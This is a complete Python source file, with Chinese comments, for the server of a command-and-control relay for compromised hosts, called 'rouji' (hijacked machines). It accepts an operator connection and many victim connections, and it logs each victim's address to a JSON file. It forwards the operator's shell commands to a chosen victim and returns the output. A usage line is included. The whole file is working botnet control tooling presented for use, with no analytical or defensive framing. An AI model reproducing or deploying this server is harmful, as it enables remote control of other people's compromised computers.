import json
import os
import sys
import socket
import threading
import time

### 常量设置
target = ""
port = 0
flag = True

rouji_json_path = "rouji.json"
Client_roujis = dict()

def add_rouji(rouji_ID,rouji_ip,rouji_port):
    rouji_all_jsons = select_rouji_all()

    # 准备增加的rouji json
    rouji_json = {
        rouji_ID : {
            "rouji_ip":rouji_ip,
            "rouji_port":rouji_port
        }
    }

    # 合并全部的rouji_json
    json_info = {**rouji_all_jsons, **rouji_json}

    # 进行更新
    update_rouji(json_info)

def delete_rouji(roujiId):
    rouji_all_jsons = select_rouji_all()

    del rouji_all_jsons[str(roujiId)]

    # 进行更新
    update_rouji(rouji_all_jsons)

def update_rouji(json_info):
    # 保存连接信息到rouji.json
    with open(rouji_json_path, 'w') as json_file:
        json.dump(json_info, json_file, indent=4)  # indent=4 用于格式化输出

def select_rouji_all():
    try:
        with open(rouji_json_path, 'r') as json_file:
            return json.load(json_file)     # 返回json文件所有内容，即一个json对象
    except Exception:
        return {}

def send_rouji_json_all():
    client_a.send(json.dumps(select_rouji_all()).encode("UTF-8"))


def rouji_json_null_check(rouji_all_jsons):
    return len(rouji_all_jsons) == 0

def select_rouji_one(roujiId):
    rouji_all_jsons = select_rouji_all()
    rouji_ids = list(rouji_all_jsons.keys())

    for rouji_id in rouji_ids:
        if rouji_id == roujiId:
            return rouji_all_jsons[rouji_id]

    return None


def server_C_listen(server_C):
    global Client_roujis
    global flag

    while flag:
        rouji_ID = int(time.time())

        client_c, address = server_C.accept()
        print(f"[*] 接收到了客户端C的连接：来自{address[0]}的{address[1]}端口")
        # 保存连接信息
        add_rouji(rouji_ID,address[0],address[1])
        Client_roujis[rouji_ID] = client_c
        # print(len(Client_roujis))

def start_server():
    global port
    global client_a
    global Client_roujis
    global flag

    # server_a 的连接
    server_A = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 开启TCP
    port_a = port - 1   # A客户端连接在port的下一个端口
    server_A.bind((target,port_a))      # 绑定IP和端口

    server_A.listen(1)    # 可连接数

    print(f"[*] 服务端开始监听在 {port} 端口，等待客户端的连接")

    client_a, address = server_A.accept()
    print(f"[*] 接收到了客户端A的连接：来自{address[0]}的{address[1]}端口")
    print("等待客户端C 的连接。。。")

    # 第一次向A发送rouji_json信息
    # send_rouji_json_all()

    '''
    server_a 连接成功，等待server_c 的连接
    '''

    # 开启server_C
    server_C = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 开启TCP
    server_C.bind((target,port))      # 绑定IP和端口

    server_C.listen(10)    # 可连接数
    # print(f"[*] 服务端开始监听在 {port} 端口")

    thread = threading.Thread(target=server_C_listen, name="server_C_listen1", args=(server_C,))
    thread.start()

    ### 三、给客户端A发送OK，表示准备好了，有rouji上线
    # client_a.send("OK".encode("UTF-8"))

    while True:
        ### 一、进行接收命令和转发命令
        # 接收命令
        data = client_a.recv(4096)
        # print(data.decode("UTF-8"))

        if "exit" == data.decode("UTF-8"):
            # client_c.send(data) # 关闭肉鸡的连接
            # 删除 rouji_json 文件
            flag = False
            if os.path.isfile(rouji_json_path):
                os.remove(rouji_json_path)
            time.sleep(1)
            for client_rouji_key in Client_roujis.keys():
                Client_roujis[client_rouji_key].close()
            break
        elif "rouji_json_xinxi" == data.decode("UTF-8"):
            send_rouji_json_all()
        else:
            try:
                # 一、分析命令、转发命令
                rouji_commands = data.decode("UTF-8").split(" #> ")  # [0] 是肉鸡的ID，[1] 是发送的命令
                rouji_id = int(rouji_commands[0])

                # 判断是不是exit的rouji退出命令
                if "exit" == rouji_commands[1]:
                    # 开始发送
                    Client_roujis[rouji_id].send("exit".encode("UTF-8"))
                    # 删除有关这个rouji 的信息
                    delete_rouji(rouji_id)
                    # 关闭这个连接
                    Client_roujis[rouji_id].close()
                else:
                    # 开始发送
                    Client_roujis[rouji_id].send(rouji_commands[1].encode("UTF-8"))

                    ### 二、发送命令后，准备接收工作 和 转发工作
                    data = Client_roujis[rouji_id].recv(4096)
                    client_a.send(data)
            except Exception as e:
                print(e)

    # 关闭连接
    server_C.close()
    client_a.close()
    server_A.close()

def usage():
    print("服务端监听: python3 server.py -lp 5555")

def main():
    global target
    global port

    args = sys.argv[1:]
    try:
        target = "0.0.0.0"
        port = int(args[-1])
        start_server()     # 进行服务端
    except:
        usage()

if __name__ == "__main__":
    main()